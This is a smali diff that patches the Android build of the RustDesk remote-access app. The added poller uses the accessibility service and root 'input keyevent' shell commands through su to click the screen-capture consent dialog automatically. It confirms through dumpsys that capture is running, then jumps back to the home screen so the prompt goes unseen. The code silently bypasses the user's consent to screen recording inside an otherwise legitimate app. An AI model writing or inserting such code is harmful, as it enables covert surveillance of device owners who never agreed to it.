@@ -21,7 +21,7 @@
 .method constructor <init>()V
     .registers 1
 
-    .line 507
+    .line 525
     invoke-direct {p0}, Ljava/lang/Object;-><init>()V
 
     return-void
@@ -30,102 +30,251 @@
 
 # virtual methods
 .method public run()V
-    .registers 8
+    .registers 16
 
-    .line 510
+    .line 528
     invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
 
     move-result-wide v0
 
-    .line 511
-    :goto_4
-    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
+    .line 529
+    const/4 v2, 0x0
 
-    move-result-wide v2
-
-    sub-long/2addr v2, v0
-
-    const-wide/16 v4, 0x1f40
-
-    cmp-long v6, v2, v4
-
-    if-gez v6, :cond_46
-
-    .line 513
-    const-wide/16 v2, 0x12c
-
-    :try_start_11
-    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
-
-    .line 514
-    const-string v2, "com.carriez.flutter_hbb.InputService"
-
-    invoke-static {v2}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
-
-    move-result-object v2
-
-    .line 515
-    const-string v3, "z"
-
-    invoke-virtual {v2, v3}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;
-
-    move-result-object v2
-
-    .line 516
-    const/4 v3, 0x1
-
-    invoke-virtual {v2, v3}, Ljava/lang/reflect/Field;->setAccessible(Z)V
-
-    .line 517
     const/4 v3, 0x0
 
-    invoke-virtual {v2, v3}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;
+    .line 530
+    :goto_6
+    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
 
-    move-result-object v2
+    move-result-wide v4
 
-    check-cast v2, Landroid/accessibilityservice/AccessibilityService;
+    sub-long/2addr v4, v0
 
-    .line 518
-    if-eqz v2, :cond_45
+    const-wide/16 v6, 0x3a98
 
-    .line 519
-    invoke-virtual {v2}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;
+    cmp-long v8, v4, v6
 
-    move-result-object v2
+    if-gez v8, :cond_b6
 
-    .line 520
-    if-eqz v2, :cond_45
+    .line 531
+    const/4 v4, 0x1
 
-    invoke-static {v2}, Lcom/carriez/flutter_hbb/AutoConsentHelper;->searchAndClickConsent(Landroid/view/accessibility/AccessibilityNodeInfo;)Z
+    add-int/2addr v3, v4
 
-    move-result v2
+    .line 533
+    const-wide/16 v5, 0x12c
 
-    if-eqz v2, :cond_45
+    :try_start_15
+    invoke-static {v5, v6}, Ljava/lang/Thread;->sleep(J)V
 
-    .line 521
-    const-string v2, "AutoConsentHelper"
+    .line 536
+    const-string v5, "com.carriez.flutter_hbb.InputService"
 
-    const-string v3, "Consent poller successfully clicked Start Now button!"
+    invoke-static {v5}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
 
-    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
+    move-result-object v5
 
-    .line 522
+    .line 537
+    const-string v6, "z"
+
+    invoke-virtual {v5, v6}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;
+
+    move-result-object v5
+
+    .line 538
+    invoke-virtual {v5, v4}, Ljava/lang/reflect/Field;->setAccessible(Z)V
+
+    .line 539
+    const/4 v6, 0x0
+
+    invoke-virtual {v5, v6}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;
+
+    move-result-object v5
+
+    check-cast v5, Landroid/accessibilityservice/AccessibilityService;
+    :try_end_2e
+    .catchall {:try_start_15 .. :try_end_2e} :catchall_b3
+
+    .line 540
+    const-wide/16 v6, 0x190
+
+    const-string v8, "AutoConsentHelper"
+
+    if-eqz v5, :cond_4c
+
+    .line 541
+    :try_start_34
+    invoke-virtual {v5}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;
+
+    move-result-object v5
+
+    .line 542
+    if-eqz v5, :cond_4c
+
+    invoke-static {v5}, Lcom/carriez/flutter_hbb/AutoConsentHelper;->searchAndClickConsent(Landroid/view/accessibility/AccessibilityNodeInfo;)Z
+
+    move-result v5
+
+    if-eqz v5, :cond_4c
+
+    .line 543
+    const-string v4, "Consent poller successfully clicked Start Now button via Accessibility!"
+
+    invoke-static {v8, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
+
+    .line 544
+    invoke-static {v6, v7}, Ljava/lang/Thread;->sleep(J)V
+
+    .line 545
     invoke-static {}, Lcom/carriez/flutter_hbb/AutoConsentHelper;->returnToHomeLauncher()V
-    :try_end_43
-    .catchall {:try_start_11 .. :try_end_43} :catchall_44
+    :try_end_4b
+    .catchall {:try_start_34 .. :try_end_4b} :catchall_b3
 
-    .line 523
-    goto :goto_46
+    .line 546
+    goto :goto_b6
 
-    .line 526
-    :catchall_44
-    move-exception v2
+    .line 551
+    :cond_4c
+    const/4 v5, 0x4
 
-    :cond_45
-    goto :goto_4
+    const/4 v9, 0x2
 
-    .line 528
-    :cond_46
-    :goto_46
+    const-string v10, "-c"
+
+    const-string v11, "/system/bin/su"
+
+    const/4 v12, 0x3
+
+    if-lt v3, v5, :cond_72
+
+    :try_start_55
+    rem-int/lit8 v5, v3, 0x3
+    :try_end_57
+    .catchall {:try_start_55 .. :try_end_57} :catchall_b3
+
+    if-nez v5, :cond_72
+
+    .line 553
+    :try_start_59
+    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
+
+    move-result-object v5
+
+    new-array v13, v12, [Ljava/lang/String;
+
+    aput-object v11, v13, v2
+
+    aput-object v10, v13, v4
+
+    const-string v14, "input keyevent 22 && sleep 0.1 && input keyevent 66"
+
+    aput-object v14, v13, v9
+
+    invoke-virtual {v5, v13}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;
+
+    .line 557
+    const-string v5, "Consent poller dispatched root DPAD/Enter keyevent for Start Now dialog."
+
+    invoke-static {v8, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
+    :try_end_6f
+    .catchall {:try_start_59 .. :try_end_6f} :catchall_70
+
+    goto :goto_71
+
+    .line 558
+    :catchall_70
+    move-exception v5
+
+    :goto_71
+    nop
+
+    .line 563
+    :cond_72
+    :try_start_72
+    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
+
+    move-result-object v5
+
+    new-array v12, v12, [Ljava/lang/String;
+
+    aput-object v11, v12, v2
+
+    aput-object v10, v12, v4
+
+    const-string v4, "dumpsys media_projection | grep -i TYPE_SCREEN_CAPTURE"
+
+    aput-object v4, v12, v9
+
+    invoke-virtual {v5, v12}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;
+
+    move-result-object v4
+
+    .line 566
+    new-instance v5, Ljava/io/BufferedReader;
+
+    new-instance v9, Ljava/io/InputStreamReader;
+
+    invoke-virtual {v4}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;
+
+    move-result-object v4
+
+    sget-object v10, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;
+
+    invoke-direct {v9, v4, v10}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;Ljava/nio/charset/Charset;)V
+
+    invoke-direct {v5, v9}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
+
+    .line 567
+    invoke-virtual {v5}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
+
+    move-result-object v4
+
+    .line 568
+    invoke-virtual {v5}, Ljava/io/BufferedReader;->close()V
+
+    .line 569
+    if-eqz v4, :cond_b2
+
+    const-string v5, "TYPE_SCREEN_CAPTURE"
+
+    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+
+    move-result v4
+
+    if-eqz v4, :cond_b2
+
+    .line 570
+    const-string v4, "MediaProjection confirmed active! Returning to home launcher..."
+
+    invoke-static {v8, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
+
+    .line 571
+    invoke-static {v6, v7}, Ljava/lang/Thread;->sleep(J)V
+
+    .line 572
+    invoke-static {}, Lcom/carriez/flutter_hbb/AutoConsentHelper;->returnToHomeLauncher()V
+    :try_end_b0
+    .catchall {:try_start_72 .. :try_end_b0} :catchall_b1
+
+    .line 573
+    goto :goto_b6
+
+    .line 575
+    :catchall_b1
+    move-exception v4
+
+    :cond_b2
+    goto :goto_b4
+
+    .line 577
+    :catchall_b3
+    move-exception v4
+
+    :goto_b4
+    goto/16 :goto_6
+
+    .line 579
+    :cond_b6
+    :goto_b6
     return-void
 .end method
